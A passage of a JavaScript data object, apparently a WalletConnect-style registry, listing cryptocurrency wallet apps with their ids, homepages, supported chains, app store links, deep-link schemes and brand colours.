            }
        },
        "20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66": {
            id: "20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66",
            name: "TokenPocket",
            homepage: "https://tokenpocket.pro/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/tokenpocket-trusted-wallet/id1436028697",
                android: "https://play.google.com/store/apps/details?id=vip.mytokenpocket",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "tpoutside:",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "TokenPocket",
                colors: {
                    primary: "rgb(41, 128, 254)",
                    secondary: ""
                }
            }
        },
        "7674bb4e353bf52886768a3ddc2a4562ce2f4191c80831291218ebd90f5f5e26": {
            id: "7674bb4e353bf52886768a3ddc2a4562ce2f4191c80831291218ebd90f5f5e26",
            name: "MathWallet",
            homepage: "https://mathwallet.org/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/math-wallet-blockchain-wallet/id1383637331",
                android: "https://play.google.com/store/apps/details?id=com.medishares.android",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "mathwallet:",
                universal: "https://www.mathwallet.org"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "MathWallet",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
        ccb714920401f7d008dbe11281ae70e3a4bfb621763b187b9e4a3ce1ab8faa3b: {
            id: "ccb714920401f7d008dbe11281ae70e3a4bfb621763b187b9e4a3ce1ab8faa3b",
            name: "BitPay",
            homepage: "https://bitpay.com",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/bitpay-buy-crypto/id1149581638",
                android: "https://play.google.com/store/apps/details?id=com.bitpay.wallet",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "bitpay:",
                universal: "https://bitpay.com/wallet"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "BitPay",
                colors: {
                    primary: "rgb(26, 59, 139)",
                    secondary: ""
                }
            }
        },
        "83f26999937cbc2e2014655796da4b05f77c1de9413a0ee6d0c6178ebcfc3168": {
            id: "83f26999937cbc2e2014655796da4b05f77c1de9413a0ee6d0c6178ebcfc3168",
            name: "Walleth",
            homepage: "https://walleth.org/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "",
                android: "https://play.google.com/store/apps/details?id=org.walleth",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Walleth",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
        "71dad538ba02a9b321041d388f9c1efe14e0d1915a2ea80a90405d2f6b67a33d": {
            id: "71dad538ba02a9b321041d388f9c1efe14e0d1915a2ea80a90405d2f6b67a33d",
            name: "Authereum",
            homepage: "https://authereum.org",
            chains: ["eip155:1"],
            app: {
                browser: "https://authereum.com/i/account",
                ios: "",
                android: "",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Authereum",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
        "9dab7bd72148e2f796452630230666daf507935fae7bb9baf22b3c11960b034f": {
            id: "9dab7bd72148e2f796452630230666daf507935fae7bb9baf22b3c11960b034f",
            name: "Dharma",
            homepage: "https://www.dharma.io/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/dharma-save-send-globally/id1495144415",
                android: "https://play.google.com/store/apps/details?id=io.dharma.Dharma",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "dharma:",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Dharma",
                colors: {
                    primary: "#0DD675",
                    secondary: "#F5F5F5"
                }
            }
        },
        "09102e7bbbd3f92001eda104abe23803181629f695e8f1b95af96d88ff7d5890": {
            id: "09102e7bbbd3f92001eda104abe23803181629f695e8f1b95af96d88ff7d5890",
            name: "1inch Wallet",
            homepage: "https://1inch.io/wallet/",
            chains: ["eip155:1", "eip155:56"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/1inch-defi-wallet/id1546049391",
                android: "",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "1inch:",
                universal: "https://wallet.1inch.io"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "1inch",
                colors: {
                    primary: "rgb(31, 36, 46)",
                    secondary: ""
                }
            }
        },
        bae74827272509a6d63ea25514d9c68ad235c14e45e183518c7ded4572a1b0c4: {
            id: "bae74827272509a6d63ea25514d9c68ad235c14e45e183518c7ded4572a1b0c4",
            name: "Huobi Wallet",
            homepage: "https://huobiwallet.com/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/id1433883012",
                android: "https://play.google.com/store/apps/details?id=com.huobionchainwallet.gp",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "huobiwallet:",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Huobi",
                colors: {
                    primary: "rgb(45,101,248)",
                    secondary: ""
                }
            }
        },
        efba9ae0a9e0fdd9e3e055ddf3c8e75f294babb8aea3499456eff27f771fda61: {
            id: "efba9ae0a9e0fdd9e3e055ddf3c8e75f294babb8aea3499456eff27f771fda61",
            name: "Eidoo",
            homepage: "https://eidoo.io/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://itunes.apple.com/app/apple-store/id1279896253",
                android: "https://play.google.com/store/apps/details?id=io.eidoo.wallet.prodnet",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "eidoo:",
                universal: "https://eidoo.io/crypto-wallet"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Eidoo",
                colors: {
                    primary: "rgb(55, 179, 159)",
                    secondary: ""
                }
            }
        },
        "61f6e716826ae8455ad16abc5ec31e4fd5d6d2675f0ce2dee3336335431f720e": {
            id: "61f6e716826ae8455ad16abc5ec31e4fd5d6d2675f0ce2dee3336335431f720e",
            name: "MYKEY",
            homepage: "https://mykey.org",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://itunes.apple.com/app/id1458318224",
                android: "https://play.google.com/store/apps/details?id=com.mykey.id",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "mykeywalletconnect:",
                universal: "https://mykey.org"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "MYKEY",
                colors: {
                    primary: "rgb(255, 255, 255)",
                    secondary: ""
                }
            }
        },
        dcf291a025ead3e94ef694fa75617568daf76bf1e525bb240ecf5bf1add53756: {
            id: "dcf291a025ead3e94ef694fa75617568daf76bf1e525bb240ecf5bf1add53756",
            name: "Loopring Wallet",
            homepage: "https://loopring.io",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/loopring-smart-wallet/id1550921126",
                android: "https://play.google.com/store/apps/details?id=loopring.defi.wallet",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Loopring",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
        "6bb4596640ce9f8c02fbaa83e3685425455a0917d025608b4abc53bfe55887c6": {
            id: "6bb4596640ce9f8c02fbaa83e3685425455a0917d025608b4abc53bfe55887c6",
            name: "TrustVault",
            homepage: "https://trustology.io/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/app/apple-store/id1455959680",
                android: "",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "TrustVault",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
        "185850e869e40f4e6c59b5b3f60b7e63a72e88b09e2a43a40b1fd0f237e49e9a": {
            id: "185850e869e40f4e6c59b5b3f60b7e63a72e88b09e2a43a40b1fd0f237e49e9a",
            name: "Atomic",
            homepage: "https://atomicwallet.io/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/atomic-wallet/id1478257827",
                android: "https://play.google.com/store/apps/details?id=io.atomicwallet",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Atomic",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
        b021913ba555948a1c81eb3d89b372be46f8354e926679de648e4fa2938bed3e: {
            id: "b021913ba555948a1c81eb3d89b372be46f8354e926679de648e4fa2938bed3e",
            name: "Coin98",
            homepage: "https://coin98.app/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://ios.coin98.app/",
                android: "https://play.google.com/store/apps/details?id=coin98.crypto.finance.media",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "coin98:",
                universal: "https://coin98.app"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Coin98",
                colors: {
                    primary: "rgb(39,39,39)",
                    secondary: ""
                }
            }
        },
        "1f69170bf7a9bdcf89403ec012659b7124e158f925cdd4a2be49274c24cf5e5d": {
            id: "1f69170bf7a9bdcf89403ec012659b7124e158f925cdd4a2be49274c24cf5e5d",
            name: "CoolWallet S",
            homepage: "https://coolwallet.io/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://itunes.apple.com/us/app/coolwallet-s-2018/id1328764142",
                android: "https://play.google.com/store/apps/details?id=com.coolbitx.cwsapp",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "CoolWallet S",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
        beea4e71c2ffbb48b59b21e33fb0049ef6522585aa9c8a33a97d3e1c81f16693: {
            id: "beea4e71c2ffbb48b59b21e33fb0049ef6522585aa9c8a33a97d3e1c81f16693",
            name: "Alice",
            homepage: "https://alicedapp.com/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/au/app/alice-browser/id1472818028",
                android: "",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Alice",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
        "138f51c8d00ac7b9ac9d8dc75344d096a7dfe370a568aa167eabc0a21830ed98": {
            id: "138f51c8d00ac7b9ac9d8dc75344d096a7dfe370a568aa167eabc0a21830ed98",
            name: "AlphaWallet",
            homepage: "https://alphawallet.com/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/alphawallet-eth-wallet/id1358230430",
                android: "https://play.google.com/store/apps/details?id=io.stormbird.wallet",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: "https://aw.app"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "AlphaWallet",
                colors: {
                    primary: "rgb(255, 255, 255)",
                    secondary: ""
                }
            }
        },
        "29f4a70ad5993f3f73ae8119f0e78ecbae51deec2a021a770225c644935c0f09": {
            id: "29f4a70ad5993f3f73ae8119f0e78ecbae51deec2a021a770225c644935c0f09",
            name: "ZelCore",
            homepage: "https://zel.network",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/zelcore/id1436296839",
                android: "https://play.google.com/store/apps/details?id=com.zelcash.zelcore",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "zel:",
                universal: "https://link.zel.network"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "ZelCore",
                colors: {
                    primary: "rgb(35, 34, 32)",
                    secondary: ""
                }
            }
        },
        "8605171a052e85d629c5efe5db804c7a3fb6d0ecc759d6817f0a18cb3dacbb14": {
            id: "8605171a052e85d629c5efe5db804c7a3fb6d0ecc759d6817f0a18cb3dacbb14",
            name: "Nash",
            homepage: "https://nash.io/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/nash-app/id1475759236",
                android: "https://play.google.com/store/apps/details?id=io.nash.app",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "nash:",
                universal: "https://nash.io/walletconnect"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Nash",
                colors: {
                    primary: "rgb(0,82,243)",
                    secondary: ""
                }
            }
        },
        nova: {
            id: "nova",
            name: "Nova Wallet"
        },
        keplr: {
            id: "keplr",
            name: "Keplr Wallet"
        },
        fox: {
            id: "fox",
            name: "FOX Wallet"
        },
        ronin: {
            id: "ronin",
            name: "Ronin Wallet"
        },
        "9277bc510b6d95f29be38e7c0e402ae8438262f0f4c6dbb40dfc22f5043e8814": {
            id: "9277bc510b6d95f29be38e7c0e402ae8438262f0f4c6dbb40dfc22f5043e8814",
            name: "Coinomi",
            homepage: "https://coinomi.com/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://itunes.apple.com/app/coinomi-wallet/id1333588809",
                android: "https://play.google.com/store/apps/details?id=com.coinomi.wallet",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Coinomi",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
        "6ec1ffc9627c3b9f87676da3f7b5796828a6c016d3253e51e771e6f951cb5702": {
            id: "6ec1ffc9627c3b9f87676da3f7b5796828a6c016d3253e51e771e6f951cb5702",
            name: "GridPlus",
            homepage: "https://gridplus.io/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "",
                android: "",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "GridPlus",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
        a395dbfc92b5519cbd1cc6937a4e79830187daaeb2c6fcdf9b9cce4255f2dcd5: {
            id: "a395dbfc92b5519cbd1cc6937a4e79830187daaeb2c6fcdf9b9cce4255f2dcd5",
            name: "CYBAVO Wallet",
            homepage: "https://cybavo.com/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/tw/app/cybavo-wallet/id1510697681",
                android: "https://play.google.com/store/apps/details?id=com.cybavo.btc.wallet",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "cybavowallet:",
                universal: "https://cdn.cybavo.com"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "CYBAVO",
                colors: {
                    primary: "rgb(255, 255, 255)",
                    secondary: ""
                }
            }
        },
        c889f5add667a8c69d147d613c7f18a4bd97c2e47c946cabfdd13ec1d596e4a0: {
            id: "c889f5add667a8c69d147d613c7f18a4bd97c2e47c946cabfdd13ec1d596e4a0",
            name: "Tokenary",
            homepage: "https://tokenary.io/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/tokenary-ethereum-wallet/id1372886601",
                android: "https://play.google.com/store/apps/details?id=com.jufy.tokenary",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Tokenary",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
        "3f1bc4a8fd72b3665459ec5c99ee51b424f6beeebe46b45f4a70cf08a84cbc50": {
            id: "3f1bc4a8fd72b3665459ec5c99ee51b424f6beeebe46b45f4a70cf08a84cbc50",
            name: "Torus",
            homepage: "https://toruswallet.io/",
            chains: ["eip155:1"],
            app: {
                browser: "https://app.tor.us/",
                ios: "",
                android: "",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Torus",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
        "7b83869f03dc3848866e0299bc630aaf3213bea95cd6cecfbe149389cf457a09": {
            id: "7b83869f03dc3848866e0299bc630aaf3213bea95cd6cecfbe149389cf457a09",
            name: "Spatium",
            homepage: "https://spatium.net/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/spatium/id1404844195",
                android: "https://play.google.com/store/apps/details?id=capital.spatium.wallet",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Spatium",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
        d0387325e894a1c4244820260ad7c78bb20d79eeec2fd59ffe3529223f3f84c6: {
            id: "d0387325e894a1c4244820260ad7c78bb20d79eeec2fd59ffe3529223f3f84c6",
            name: "Infinito",
            homepage: "https://infinitowallet.io/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/infinito-wallet/id1315572736",
                android: "https://play.google.com/store/apps/details?id=io.infinito.wallet",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Infinito",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
        "176b83d9268d77438e32aa44770fb37b40d6448740b6a05a97b175323356bd1b": {
            id: "176b83d9268d77438e32aa44770fb37b40d6448740b6a05a97b175323356bd1b",
            name: "wallet.io",
            homepage: "https://wallet.io/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/vn/app/wallet-io/id1459857368",
                android: "https://play.google.com/store/apps/details?id=io.wallet",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "wallet.io",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
        "802a2041afdaf4c7e41a2903e98df333c8835897532699ad370f829390c6900f": {
            id: "802a2041afdaf4c7e41a2903e98df333c8835897532699ad370f829390c6900f",
            name: "Infinity Wallet",
            homepage: "https://infinitywallet.io/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "",
                android: "",
                mac: "https://infinitywallet.io/desktop",
                windows: "https://infinitywallet.io/desktop",
                linux: "https://infinitywallet.io/desktop"
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Infinity",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
        bitverse: {
            id: "bitverse",
            name: "BitVerse Wallet"
        },
        solace: {
            id: "solace",
            name: "Solace Wallet"
        },
        "8fb830a15679a8537d84c3852e026a4bdb39d0ee3b387411a91e8f6abafdc1ad": {
            id: "8fb830a15679a8537d84c3852e026a4bdb39d0ee3b387411a91e8f6abafdc1ad",
            name: "Ownbit",
            homepage: "https://ownbit.io/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/es/app/ownbit-btc-eth-cold-wallet/id1321798216",
                android: "https://play.google.com/store/apps/details?id=com.bitbill.www",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Ownbit",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
        "244a0d93a45df0d0501a9cb9cdfb4e91aa750cfd4fc88f6e97a54d8455a76f5c": {
            id: "244a0d93a45df0d0501a9cb9cdfb4e91aa750cfd4fc88f6e97a54d8455a76f5c",
            name: "EasyPocket",
            homepage: "https://easypocket.app/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/id1517338927",
                android: "https://easypocket.app/",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "easypocket:",
                universal: "https://wallet.easypocket.app"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "EasyPocket",
                colors: {
                    primary: "rgb(17, 93, 251)",
                    secondary: ""
                }
            }
        },
        "881946407ff22a32ec0e42b2cd31ea5dab52242dc3648d777b511a0440d59efb": {
            id: "881946407ff22a32ec0e42b2cd31ea5dab52242dc3648d777b511a0440d59efb",
            name: "Bridge Wallet",
            homepage: "https://mtpelerin.com/bridge-wallet",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/bridge-wallet/id1481859680",
                android: "https://play.google.com/store/apps/details?id=com.mtpelerin.bridge",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Bridge",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
        "3b0e861b3a57e98325b82ab687fe0a712c81366d521ceec49eebc35591f1b5d1": {
            id: "3b0e861b3a57e98325b82ab687fe0a712c81366d521ceec49eebc35591f1b5d1",
            name: "SparkPoint",
            homepage: "https://sparkpoint.io/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "",
                android: "https://play.google.com/store/apps/details?id=com.sparkpoint",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "sparkpoint:",
                universal: "https://sparkpoint.io"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "SparkPoint",
                colors: {
                    primary: "rgb(20,67,95)",
                    secondary: ""
                }
            }
        },
        ca86f48760bf5f84dcd6b1daca0fd55e2aa073ecf46453ba8a1db0b2e8e85ac1: {
            id: "ca86f48760bf5f84dcd6b1daca0fd55e2aa073ecf46453ba8a1db0b2e8e85ac1",
            name: "ViaWallet",
            homepage: "https://viawallet.com/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://itunes.apple.com/us/app/viawallet/id1462031389",
                android: "https://play.google.com/store/apps/details?id=com.viabtc.wallet",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "ViaWallet",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
        "42d72b6b34411dfacdf5364c027979908f971fc60251a817622b7bdb44a03106": {
            id: "42d72b6b34411dfacdf5364c027979908f971fc60251a817622b7bdb44a03106",
            name: "BitKeep",
            homepage: "https://bitkeep.com/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://itunes.apple.com/app/bitkeep/id1395301115",
                android: "https://play.google.com/store/apps/details?id=com.bitkeep.wallet",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "bitkeep:",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "BitKeep",
                colors: {
                    primary: "rgb(255, 255, 255)",
                    secondary: ""
                }
            }
        },
        b642ab6de0fe5c7d1e4a2b2821c9c807a81d0f6fd42ee3a75e513ea16e91151c: {
            id: "b642ab6de0fe5c7d1e4a2b2821c9c807a81d0f6fd42ee3a75e513ea16e91151c",
            name: "Vision",
            homepage: "https://vision-crypto.com/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/id1500186931",
                android: "https://play.google.com/store/apps/details?id=com.eletac.tronwallet",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Vision",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
        "38ee551a01e3c5af9d8a9715768861e4d642e2381a62245083f96672b5646c6b": {
            id: "38ee551a01e3c5af9d8a9715768861e4d642e2381a62245083f96672b5646c6b",
            name: "PEAKDEFI Wallet",
            homepage: "https://peakdefi.com/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/app/peakdefi-wallet/id1526193527",
                android: "https://play.google.com/store/apps/details?id=com.peakdefiwallet",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "peakdefiwallet:",
                universal: "https://peakdefi.com/download"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "PEAKDEFI",
                colors: {
                    primary: "rgb(255, 255, 255)",
                    secondary: ""
                }
            }
        },
        "7e90b95230bc462869bbb59f952273d89841e1c76bcc5319898e08c9f34bd4cd": {
            id: "7e90b95230bc462869bbb59f952273d89841e1c76bcc5319898e08c9f34bd4cd",
            name: "Unstoppable Wallet",
            homepage: "https://unstoppable.money/",
            chains: ["eip155:1", "eip155:56"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/app/bank-bitcoin-wallet/id1447619907?ls=1",
                android: "https://play.google.com/store/apps/details?id=io.horizontalsystems.bankwallet",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "moneyunstoppable:",
                universal: "https://unstoppable.money/"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Unstoppable",
                colors: {
                    primary: "#FFBE43",
                    secondary: ""
                }
            }
        },
        "025247d02e1972362982f04c96c78e7c02c4b68a9ac2107c26fe2ebb85c317c0": {
            id: "025247d02e1972362982f04c96c78e7c02c4b68a9ac2107c26fe2ebb85c317c0",
            name: "HaloDeFi Wallet",
            homepage: "https://halodefi.org/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "",
                android: "https://play.google.com/store/apps/details?id=com.halodefi.wallet",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "halodefiwallet:",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "HaloDeFi",
                colors: {
                    primary: "rgb(255, 255, 255)",
                    secondary: ""
                }
            }
        },
        d12b6e114af8c47a6eec19a576f1022032a5ee4f8cafee612049f4796c803c7e: {
            id: "d12b6e114af8c47a6eec19a576f1022032a5ee4f8cafee612049f4796c803c7e",
            name: "Dok Wallet",
            homepage: "https://dokwallet.com/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/il/app/dokwallet-crypto-wallet/id1533065700",
                android: "https://play.google.com/store/apps/details?id=com.dok.wallet",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Dok",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
        "3d56ed42374504f1bb2ba368094269eaea461c075ab796d504f354baac213dc5": {
            id: "3d56ed42374504f1bb2ba368094269eaea461c075ab796d504f354baac213dc5",
            name: "AT.Wallet",
            homepage: "https://authentrend.com/at-wallet/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/at-wallet/id1479171310",
                android: "https://play.google.com/store/apps/details?id=com.authentrend.atwallet",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "AT.Wallet",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
        "1e04cf5cddcd84edb1370b12eae1fcecedf125b77209fff80e7ef2a6d3c74719": {
            id: "1e04cf5cddcd84edb1370b12eae1fcecedf125b77209fff80e7ef2a6d3c74719",
            name: "Midas Wallet",
            homepage: "https://midasprotocol.io/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://itunes.apple.com/us/app/midas-protocol-crypto-wallet/id1436698193",
                android: "https://play.google.com/store/apps/details?id=com.midasprotocol.wallet.android",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Midas",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
        "15d1d97de89526a3c259a235304a7c510c40cda3331f0f8433da860ecc528bef": {
            id: "15d1d97de89526a3c259a235304a7c510c40cda3331f0f8433da860ecc528bef",
            name: "Ellipal",
            homepage: "https://ellipal.com/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/ellipal/id1426179665",
                android: "https://play.google.com/store/apps/details?id=com.ellipal.wallet",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "ellipal:",
                universal: "https://www.ellipal.com/"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Ellipal",
                colors: {
                    primary: "rgb(48, 124, 249)",
                    secondary: ""
                }
            }
        },
        "0fa0f603076de79bbac9a4d47770186de8913da63c8a4070c500a783cddbd1e3": {
            id: "0fa0f603076de79bbac9a4d47770186de8913da63c8a4070c500a783cddbd1e3",
            name: "KEYRING PRO",
            homepage: "https://keyring.app/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/keyring-pro-wallet-management/id1546824976",
                android: "https://play.google.com/store/apps/details?id=co.bacoor.keyring",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "keyring:",
                universal: "https://keyring.app"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "KEYRINGPRO",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
